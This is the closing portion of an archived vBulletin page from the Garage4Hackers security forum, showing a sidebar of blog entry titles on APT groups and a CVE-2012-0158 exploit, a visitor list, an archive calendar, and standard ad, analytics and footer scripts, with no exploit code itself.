			</div>
			<div class="blockbody" id="c_blog_entries">
				<ul class="blockrow">
					<li class="avatarcontent floatcontainer">
	<a class="smallavatar">
		
		<img width="30" alt="" src="images/misc/unknown.html" title=""/>
		
	</a>
	<div class="smallavatartext">
		
		<a href="entryf3bc.html?b=3121">Apt inception</a>
		
		<br />
		
		03-23-2015 <span class="time">05:09 PM</span>
	</div>
</li><li class="avatarcontent floatcontainer">
	<a class="smallavatar">
		
		<img width="30" alt="" src="images/misc/unknown.html" title=""/>
		
	</a>
	<div class="smallavatartext">
		
		<a href="entry87b8.html?b=3117">Apt sme</a>
		
		<br />
		
		03-20-2015 <span class="time">11:41 AM</span>
	</div>
</li><li class="avatarcontent floatcontainer">
	<a class="smallavatar">
		
		<img width="30" alt="" src="images/misc/unknown.html" title=""/>
		
	</a>
	<div class="smallavatartext">
		
		<a href="entryc095.html?b=3116">Apt vitnam</a>
		
		<br />
		
		03-20-2015 <span class="time">11:34 AM</span>
	</div>
</li><li class="avatarcontent floatcontainer">
	<a class="smallavatar">
		
		<img width="30" alt="" src="images/misc/unknown.html" title=""/>
		
	</a>
	<div class="smallavatartext">
		
		<a href="entry5442.html?b=3115">Apt carbanak</a>
		
		<br />
		
		03-20-2015 <span class="time">11:30 AM</span>
	</div>
</li><li class="avatarcontent floatcontainer">
	<a class="smallavatar">
		
		<img width="30" alt="" src="images/misc/unknown.html" title=""/>
		
	</a>
	<div class="smallavatartext">
		
		<a href="entryae46.html?b=1623">Exploit for  MS WORD 2010 in Windows 7 (CVE-2012-0158)</a>
		
		<br />
		
		03-01-2014 <span class="time">04:14 PM</span>
	</div>
</li>
				</ul>
			</div>
		</div>
		<div class="underblock"></div>
	</li>

<li id="block_visitors">
	<div class="block" id="block_visitors_div">
		<div class="blocksubhead" id="block_visitors_handle">
			<a href="#top" id="collapse_c_blog_visitors" class="collapse"><img id="collapseimg_blog_visitors" src="images/buttons/collapse_40b.png" alt="" border="0" /></a>
			Recent Visitors
		</div>
		<div class="blockbody" id="c_blog_visitors">
			<div class="blockrow">
				<ul id="recent_visitors_list" class="commalist">
					
						<li><a class="username" href="memberf35f.html?u=61">&quot;vinnu&quot;</a>, </li>
					
						<li><a class="username" href="member0612.html?u=16">41.w4r10r</a>, </li>
					
						<li><a class="username" href="membere62c.html?u=191">abhaythehero</a>, </li>
					
						<li><a class="username" href="member5626.html?u=2">b0nd</a>, </li>
					
						<li><a class="username" href="memberc79f.html?u=3283">c0dist</a>, </li>
					
						<li><a class="username" href="memberf9e2.html?u=24939">kakarrot</a>, </li>
					
						<li><a class="username" href="memberc0d8.html?u=25237">kolaz</a>, </li>
					
						<li><a class="username" href="member638c.html?u=24940">rakesh786</a>, </li>
					
						<li><a class="username" href="memberf997.html?u=25331">smackdown</a>, </li>
					
						<li><a class="username" href="memberb428.html?u=25907">Test12</a></li>
					
				</ul>
			</div>
		</div>
	</div>
	<div class="underblock"></div>
</li>
<li id="block_archive">
	<div class="block blogusermenu" id="vb_blogcalendar">
		<div id="block_archive_div" class="calendar mini">
	<h4 class="blocksubhead smaller moveable" id="block_archive_handle">
		<a href="#top" id="collapse_c_blog_calendar" class="collapse"><img src="images/buttons/collapse_40b.png" alt="" /></a>
		Archive
	</h4>
	<div class="blockbody" id="c_blog_calendar">
		<table width="100%" class="blockrow">
			<tr>
				
					<th class="blocksubhead" align="center" id="vb_blogcalendar_prevmonth" prevmonth="3" prevyear="2015">
						&nbsp;
						
							<a href="blog7ea0.html?u=8196&amp;m=3&amp;y=2015">&lt;</a>
						
						&nbsp;
					</th>
									
				<th class="blocksubhead" colspan="5" align="center" id="vb_blogcalendar_currentmonth">
					
						<a href="blog4ac8.html?u=8196&amp;m=3&amp;y=2020">March 2020</a>
					
				</th>
				
					<th class="blocksubhead">
						&nbsp;&nbsp;&nbsp;
					</th>
 				
         		</tr>
			<tr align="center">
				<td class="blogsubheader">Su</td>
				<td class="blogsubheader">Mo</td>
				<td class="blogsubheader">Tu</td>
				<td class="blogsubheader">We</td>
				<td class="blogsubheader">Th</td>
				<td class="blogsubheader">Fr</td>
				<td class="blogsubheader">Sa</td>
			</tr>
			<tr><td class="othermonth">
	
		<span class="simpleday">23</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">24</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">25</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">26</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">27</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">28</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">29</span>
	
</td></tr><tr><td>
	
		<span class="simpleday">1</span>
	
</td><td>
	
		<span class="simpleday">2</span>
	
</td><td>
	
		<span class="simpleday">3</span>
	
</td><td>
	
		<span class="simpleday">4</span>
	
</td><td>
	
		<span class="simpleday">5</span>
	
</td><td>
	
		<span class="simpleday">6</span>
	
</td><td>
	
		<span class="simpleday">7</span>
	
</td></tr><tr><td>
	
		<span class="simpleday">8</span>
	
</td><td>
	
		<span class="simpleday">9</span>
	
</td><td>
	
		<span class="simpleday">10</span>
	
</td><td>
	
		<span class="simpleday">11</span>
	
</td><td>
	
		<span class="simpleday">12</span>
	
</td><td>
	
		<span class="simpleday">13</span>
	
</td><td>
	
		<span class="simpleday">14</span>
	
</td></tr><tr><td>
	
		<span class="simpleday">15</span>
	
</td><td>
	
		<span class="simpleday">16</span>
	
</td><td>
	
		<span class="simpleday">17</span>
	
</td><td>
	
		<span class="simpleday">18</span>
	
</td><td>
	
		<span class="simpleday">19</span>
	
</td><td>
	
		<span class="simpleday">20</span>
	
</td><td>
	
		<span class="simpleday">21</span>
	
</td></tr><tr><td class="today" title="Today">
	
		<span class="simpleday">22</span>
	
</td><td>
	
		<span class="simpleday">23</span>
	
</td><td>
	
		<span class="simpleday">24</span>
	
</td><td>
	
		<span class="simpleday">25</span>
	
</td><td>
	
		<span class="simpleday">26</span>
	
</td><td>
	
		<span class="simpleday">27</span>
	
</td><td>
	
		<span class="simpleday">28</span>
	
</td></tr><tr><td>
	
		<span class="simpleday">29</span>
	
</td><td>
	
		<span class="simpleday">30</span>
	
</td><td>
	
		<span class="simpleday">31</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">1</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">2</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">3</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">4</span>
	
</td></tr>
		</table>
	</div>
</div>
	</div>
	<div class="underblock"></div>
	<script type="text/javascript" src="clientscript/blog_ajax_calendar6719.js?v=421"></script>
	<script type="text/javascript">
	<!--
		blogCalendar = new vB_AJAX_BlogCalendar('blogCalendar', 'vb_blogcalendar', 3, 2020, 8196);
	//-->
	</script>
</li>
	</ul>
	
	
</div></div>
	
	<div class="cleardiv"></div>
</div>


<div style="clear: left">
  
<div class="google_adsense_footer" style="width:468px; margin:0 auto; padding-top:1em">
<script type="text/javascript"><!--
google_ad_client = "ca-pub-6847984837250662";
google_ad_host = "ca-host-pub-2606800903002383";
google_ad_width = 468;
google_ad_height = 60;
google_ad_format = "468x60_as";
google_ad_type = "text_image";
google_ad_channel = "";
google_color_border = "";
google_color_bg = "";
google_color_link = "";
google_color_text = "";
google_color_url = "";
google_ui_features = "rc:6";
//-->
</script>
<script type="text/javascript"
  src="../pagead2.googlesyndication.com/pagead/show_ads.js">
</script>
</div>

  <div id="ad_global_above_footer"><div align="center">
<script type="text/javascript"><!--
google_ad_client = "pub-6847984837250662";
/* 728x90, created 7/9/10 */
google_ad_slot = "7101394260";
google_ad_width = 728;
google_ad_height = 90;
//-->
</script>
<script type="text/javascript"
src="../pagead2.googlesyndication.com/pagead/show_ads.js">
</script></div>
</div>

<div id="footer" class="floatcontainer footer">

	<form action="../external.html?link=http://garage4hackers.com/forum.php" method="get" id="footer_select" class="footer_select">

		
			<select name="styleid" onchange="switch_id(this, 'style')">
				<optgroup label="Quick Style Chooser"><option class="hidden"></option></optgroup>
				
					
					<optgroup label="&nbsp;Standard Styles">
									
					
	<option value="1" class="" selected="selected">-- Default Style</option>

					
					</optgroup>
										
				
				
					
					<optgroup label="&nbsp;Mobile Styles">
					
					
	<option value="2" class="" >-- Default Mobile Style</option>

					
					</optgroup>
										
				
			</select>	
		
		
		
	</form>

	<ul id="footer_links" class="footer_links">
		<li><a href="sendmessage.html" rel="nofollow" accesskey="9">Contact Us</a></li>
		<li><a href="index.html">Garage4hackers</a></li>
		
		
		<li><a href="archive/index.html">Archive</a></li>
		<li><a href="../external.html?link=http://glowhost.com/" target="_blank">Web Hosting</a></li>
		
		
		<li><a href="entryf3bc.html?b=3121#top" onclick="document.location.hash='top'; return false;">Top</a></li>
	</ul>
	
	
	
	
	<script type="text/javascript">
	<!--
		// Main vBulletin Javascript Initialization
		vBulletin_init();
		function md5hash(B,A,E,C){if(navigator.userAgent.indexOf("Mozilla/index.html")==1&&parseInt(navigator.appVersion)>=4){var D=hex_md5(str_to_ent(trim(B.value)));A.value=D;if(E){D=hex_md5(trim(B.value));E.value=D}if(!C){B.value=""}}return true};
	//-->
	</script>
        
</div>
</div> <!-- closing div for body_wrapper -->

<div class="below_body">
<div id="footer_time" class="shade footer_time">All times are GMT +5.5. The time now is <span class="time">04:08 PM</span>.</div>

<div id="footer_copyright" class="shade footer_copyright">
	<!-- Do not remove this copyright notice -->
	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
	<!-- Do not remove this copyright notice -->	
</div>
<div id="footer_morecopyright" class="shade footer_morecopyright">
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	Copyright 2010 - 2017, Garage4Hackers
	
</div>
 

	<div id="fb-root"></div>
<script type="text/javascript" src="clientscript/vbulletin_facebook6719.js?v=421"></script>

<script type="text/javascript">
<!--
	loadFacebookAPI('en_US');
	function fbAsyncInit()
	{
		vBfb = new vB_Facebook({
			appid : "170793809601191",
			connected : 0,
			active : 0,
			autoreg : 0,
			feed_newthread : 1,
			feed_postreply : 1,
			feed_blogentry : 1,
			feed_blogcomment : 1,
			feed_newarticle : 1,
			feed_articlecomment : 1
		});
	}
// -->
</script>

</div>
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
try{
var pageTracker = _gat._getTracker('UA-17311051-3');
pageTracker._trackPageview();
} catch(err) {}</script>
</body>
</html>